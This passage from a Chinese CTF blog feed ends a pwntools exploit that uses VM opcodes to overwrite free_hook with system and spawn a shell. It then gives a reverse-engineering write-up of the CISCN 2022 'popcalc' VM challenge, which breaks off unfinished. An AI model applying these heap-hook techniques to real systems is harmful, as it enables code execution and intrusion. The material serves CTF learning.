class=\"string\">&quot;\\033[0m&quot;</span>))</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;content:&quot;</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">1</span>+p64(<span class=\"number\">0x31</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">7</span>+p64(<span class=\"number\">0x41</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">newcode = []</span><br><span class=\"line\">key=free_hook-<span class=\"number\">0x8</span></span><br><span class=\"line\"></span><br><span class=\"line\">newcode.append(write(<span class=\"number\">0x21</span>,<span class=\"number\">0x1</span>))</span><br><span class=\"line\">newcode.append(write(<span class=\"number\">0x21</span>,<span class=\"number\">0x1</span>))</span><br><span class=\"line\">newcode.append(write(<span class=\"number\">0x20</span>,<span class=\"number\">0x01</span>))</span><br><span class=\"line\">newcode.append(write(<span class=\"number\">0x28</span>,key&amp;<span class=\"number\">0xff</span>))</span><br><span class=\"line\">key = key&gt;&gt;<span class=\"number\">8</span></span><br><span class=\"line\">newcode.append(write(<span class=\"number\">0x29</span>,key&amp;<span class=\"number\">0xff</span>))</span><br><span class=\"line\">key = key&gt;&gt;<span class=\"number\">8</span></span><br><span class=\"line\">newcode.append(write(<span class=\"number\">0x2a</span>,key&amp;<span class=\"number\">0xff</span>))</span><br><span class=\"line\">key = key&gt;&gt;<span class=\"number\">8</span></span><br><span class=\"line\">newcode.append(write(<span class=\"number\">0x2b</span>,key&amp;<span class=\"number\">0xff</span>))</span><br><span class=\"line\">key = key&gt;&gt;<span class=\"number\">8</span></span><br><span class=\"line\">newcode.append(write(<span class=\"number\">0x2c</span>,key&amp;<span class=\"number\">0xff</span>))</span><br><span class=\"line\">key = key&gt;&gt;<span class=\"number\">8</span></span><br><span class=\"line\">newcode.append(write(<span class=\"number\">0x2d</span>,key&amp;<span class=\"number\">0xff</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">newcode.append(jmp(<span class=\"number\">0</span>,<span class=\"number\">0</span>))</span><br><span class=\"line\">newcode.append(malloc(<span class=\"number\">0x30</span>))\t\t<span class=\"comment\">#origin</span></span><br><span class=\"line\">newcode.append(malloc(<span class=\"number\">0x30</span>))\t\t<span class=\"comment\">#aimedn</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;How many codes do you want to set? &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(newcode)))</span><br><span class=\"line\">x=<span class=\"number\">0</span></span><br><span class=\"line\">y=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(newcode)):</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;X:&quot;</span>,<span class=\"built_in\">str</span>(x))</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Y:&quot;</span>,<span class=\"built_in\">str</span>(y))</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Code:&quot;</span>,<span class=\"built_in\">str</span>(newcode[i]))</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\033[1;35m [+] : &quot;</span>+<span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(newcode[i])+<span class=\"string\">&quot;\\033[0m&quot;</span>))</span><br><span class=\"line\">\tx +=<span class=\"number\">1</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> x  == Xn:</span><br><span class=\"line\">\t\ty+=<span class=\"number\">1</span></span><br><span class=\"line\">\t\tx=<span class=\"number\">0</span></span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Start X:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\">gdb.attach(r,<span class=\"string\">&#x27;brva 0x0139D&#x27;</span>)\t\t\t\t<span class=\"comment\">#set </span></span><br><span class=\"line\">pause()</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Start Y:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;brva 0x1439&#x27;)\t\t\t# malloc printf(&quot;you say&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;content:&quot;</span>,<span class=\"string\">b&#x27;aaaaaa\\n&#x27;</span>)</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;content:&quot;</span>,<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>+p64(system))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"备注\"><a class=\"markdownIt-Anchor\" href=\"#备注\">#</a> 备注：</h2>\n<p>因为博客环境搭建问题，不能上传图片和文件包，需要题目及 ida 的逆向文件的朋友，可联系 QQ3263367390</p>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/06/19/ciscn-2022-popcalc/",
            "url": "http://example.com/2022/06/19/ciscn-2022-popcalc/",
            "title": "ciscn_2022_popcalc",
            "date_published": "2022-06-19T08:41:12.000Z",
            "content_html": "<h1 id=\"ciscn_2022-popcalc\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2022-popcalc\">#</a> CISCN_2022   popcalc</h1>\n<p>一道 vm 的题目。一开始出题人就搞活，之前也遇到过几次，这次也是稍微学到了。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v3; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+Ch] [rbp-64h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v6; <span class=\"comment\">// [rsp+10h] [rbp-60h]</span></span><br><span class=\"line\">  <span class=\"type\">void</span> **dest; <span class=\"comment\">// [rsp+18h] [rbp-58h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> src[<span class=\"number\">56</span>]; <span class=\"comment\">// [rsp+20h] [rbp-50h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v9; <span class=\"comment\">// [rsp+58h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v9 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  dest = (<span class=\"type\">void</span> **)mmap((<span class=\"type\">void</span> *)<span class=\"number\">0xDEAD0000</span>LL, <span class=\"number\">0x30</span>uLL, <span class=\"number\">3</span>, <span class=\"number\">33</span>, <span class=\"number\">-1</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  sub_401286(src);</span><br><span class=\"line\">  <span class=\"built_in\">memcpy</span>(dest, src, <span class=\"number\">0x30</span>uLL);</span><br><span class=\"line\">  v6 = read(<span class=\"number\">0</span>, dest[<span class=\"number\">2</span>], <span class=\"number\">0x10000</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; v6 / <span class=\"number\">4</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v3 = *((_DWORD *)dest[<span class=\"number\">2</span>] + i) - <span class=\"number\">49</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v3 &lt;= <span class=\"number\">8</span> )</span><br><span class=\"line\">      __asm &#123; jmp     rax &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  sub_4012FC(src);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//汇编代码</span></span><br><span class=\"line\">.text:<span class=\"number\">00000000004014F</span>1                 lea     rdx, unk_402010</span><br><span class=\"line\">.text:<span class=\"number\">00000000004014F</span>8                 add     rax, rdx</span><br><span class=\"line\">.text:<span class=\"number\">00000000004014F</span>B                 db      <span class=\"number\">3</span>Eh</span><br><span class=\"line\">.text:<span class=\"number\">00000000004014F</span>B                 jmp     rax</span><br></pre></td></tr></table></figure>\n<p>修复之后的代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _DWORD *v3; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v4; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v5; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v6; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v7; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v8; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v9; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v10; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v11; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v12; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v13; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v14; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v15; <span class=\"comment\">// rcx</span></span><br><span class=\"line\">  __int64 v16; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  __int64 v17; <span class=\"comment\">// rsi</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v18; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+Ch] [rbp-64h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v21; <span class=\"comment\">// [rsp+Ch] [rbp-64h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v22; <span class=\"comment\">// [rsp+Ch] [rbp-64h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v23; <span class=\"comment\">// [rsp+Ch] [rbp-64h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v24; <span class=\"comment\">// [rsp+Ch] [rbp-64h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v25; <span class=\"comment\">// [rsp+Ch] [rbp-64h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v26; <span class=\"comment\">// [rsp+Ch] [rbp-64h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v27; <span class=\"comment\">// [rsp+10h] [rbp-60h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v28; <span class=\"comment\">// [rsp+14h] [rbp-5Ch]</span></span><br><span class=\"line\">  __int64 *dest; <span class=\"comment\">// [rsp+18h] [rbp-58h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> src[<span class=\"number\">56</span>]; <span class=\"comment\">// [rsp+20h] [rbp-50h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v31; <span class=\"comment\">// [rsp+58h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v31 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  dest = (__int64 *)mmap((<span class=\"type\">void</span> *)<span class=\"number\">0xDEAD0000</span>LL, <span class=\"number\">0x30</span>uLL, <span class=\"number\">3</span>, <span class=\"number\">33</span>, <span class=\"number\">-1</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  sub_401286(src);</span><br><span class=\"line\">  <span class=\"built_in\">memcpy</span>(dest, src, <span class=\"number\">0x30</span>uLL);</span><br><span class=\"line\">  v27 = read(<span class=\"number\">0</span>, (<span class=\"type\">void</span> *)dest[<span class=\"number\">2</span>], <span class=\"number\">0x10000</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; v27 / <span class=\"number\">4</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> ( *(_DWORD *)(<span class=\"number\">4LL</span> * i + dest[<span class=\"number\">2</span>]) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;1&#x27;</span>:</span><br><span class=\"line\">        v21 = i + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * v21 + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        i = v21 + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * i + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        v3 = (_DWORD *)dest[<span class=\"number\">3</span>];</span><br><span class=\"line\">        *v3 = sub_4013AC(dest);</span><br><span class=\"line\">        v4 = (_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        *v4 = sub_4013AC(dest);</span><br><span class=\"line\">        *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>) = *(_DWORD *)dest[<span class=\"number\">3</span>] + *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>));</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;2&#x27;</span>:</span><br><span class=\"line\">        v22 = i + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * v22 + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        i = v22 + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * i + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        v5 = (_DWORD *)dest[<span class=\"number\">3</span>];</span><br><span class=\"line\">        *v5 = sub_4013AC(dest);</span><br><span class=\"line\">        v6 = (_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        *v6 = sub_4013AC(dest);</span><br><span class=\"line\">        *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>) = *(_DWORD *)dest[<span class=\"number\">3</span>] - *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>));</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;3&#x27;</span>:</span><br><span class=\"line\">        v23 = i + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * v23 + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        i = v23 + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * i + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        v7 = (_DWORD *)dest[<span class=\"number\">3</span>];</span><br><span class=\"line\">        *v7 = sub_4013AC(dest);</span><br><span class=\"line\">        v8 = (_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        *v8 = sub_4013AC(dest);</span><br><span class=\"line\">        *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>) = *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>) * *(_DWORD *)dest[<span class=\"number\">3</span>];</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>));</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;4&#x27;</span>:</span><br><span class=\"line\">        v24 = i + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * v24 + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        i = v24 + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * i + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        v9 = (_DWORD *)dest[<span class=\"number\">3</span>];</span><br><span class=\"line\">        *v9 = sub_4013AC(dest);</span><br><span class=\"line\">        v10 = (_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        *v10 = sub_4013AC(dest);</span><br><span class=\"line\">        *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>) = *(_DWORD *)dest[<span class=\"number\">3</span>] / *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>));</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;5&#x27;</span>:</span><br><span class=\"line\">        v25 = i + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * v25 + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        i = v25 + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * i + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        v11 = (_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        *v11 = sub_4013AC(dest);</span><br><span class=\"line\">        v12 = (_DWORD *)dest[<span class=\"number\">3</span>];</span><br><span class=\"line\">        *v12 = sub_4013AC(dest);</span><br><span class=\"line\">        *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>) = *(_DWORD *)dest[<span class=\"number\">3</span>] &lt;&lt; *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>));</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;6&#x27;</span>:</span><br><span class=\"line\">        v26 = i + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * v26 + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        i = v26 + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * i + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        v13 = (_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        *v13 = sub_4013AC(dest);</span><br><span class=\"line\">        v14 = (_DWORD *)dest[<span class=\"number\">3</span>];</span><br><span class=\"line\">        *v14 = sub_4013AC(dest);</span><br><span class=\"line\">        *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>) = *(<span class=\"type\">int</span> *)dest[<span class=\"number\">3</span>] &gt;&gt; *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>));</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;7&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( *((<span class=\"type\">int</span> *)dest + <span class=\"number\">2</span>) &gt; <span class=\"number\">65</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          *dest = ((__int64 (__fastcall *)(__int64))dest[<span class=\"number\">4</span>])(<span class=\"number\">256LL</span>);</span><br><span class=\"line\">          *((_DWORD *)dest + <span class=\"number\">2</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        v15 = (_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4LL</span> * *(<span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * ++i + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        v16 = *dest;</span><br><span class=\"line\">        *(_DWORD *)(<span class=\"number\">4LL</span> * (<span class=\"type\">int</span>)++*((_DWORD *)dest + <span class=\"number\">2</span>) + v16) = *v15;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;8&#x27;</span>:</span><br><span class=\"line\">        v28 = *(_DWORD *)(<span class=\"number\">4LL</span> * ++i + dest[<span class=\"number\">2</span>]);</span><br><span class=\"line\">        v17 = *dest;</span><br><span class=\"line\">        v18 = *((_DWORD *)dest + <span class=\"number\">2</span>);</span><br><span class=\"line\">        *((_DWORD *)dest + <span class=\"number\">2</span>) = v18 - <span class=\"number\">1</span>;</span><br><span class=\"line\">        *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4LL</span> * v28) = *(_DWORD *)(v17 + <span class=\"number\">4LL</span> * v18);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;9&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( *((_DWORD *)dest + <span class=\"number\">10</span>) )</span><br><span class=\"line\">          *(_DWORD *)(*dest + <span class=\"number\">4LL</span> * *((<span class=\"type\">int</span> *)dest + <span class=\"number\">2</span>)) += *(_DWORD *)(<span class=\"number\">4LL</span> * ++i + dest[<span class=\"number\">2</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  sub_4012FC(src);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>逆向的工作量比较大。但是大概理了下里面数据的存储格式，以 4 字节作为基本的处理单元，每次处理 3 个或者两个，第一个用作 case 的判断。</p>\n<ol>\n<li>加法</li>\n<li>减法</li>\n<li>乘法</li>\n<li>除法</li>\n<li>左移位</li>\n<li>右移位</li>\n<li>push    RI  count 大于 65, 重新申请一个 0x100 的 chunk 用作函数的 stack。储存算术的数据，但是，不会检查 idx，可能会导致越界。</li>\n<li>pop RI</li>\n<li>push imm32</li>\n</ol>\n<p>以上均为接受两个 int 类型，我们的基本操作快的数量不超过 64，为什么这这样说，加载操作数的时候，加两次，将操作数拿出来，减去两次，储存计算结果加一次。</p>\n<p>程序实现基本的算术运算以及逻辑运算。并且采用了 stack 进行存储，但是程序没有输出啊。</p>\n<h2 id=\"尚未解决\"><a class=\"markdownIt-Anchor\" href=\"#尚未解决\">#</a> 